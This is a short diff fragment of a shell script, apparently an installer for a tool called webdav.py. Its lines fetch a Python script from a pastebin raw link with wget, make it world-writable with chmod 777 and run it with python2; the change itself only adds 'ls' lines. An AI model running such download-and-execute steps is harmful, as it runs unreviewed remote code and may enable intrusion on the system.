@@ -22,9 +22,11 @@ wget http://pastebin.com/raw/HnVyQPtR
 mv HnVyQPtR webdav.py
 chmod 777 webdav.py
 python2 webdav.py
+ls
 cd webdav
+ls
 python2 webdav.py
-echo
+
 
 
 
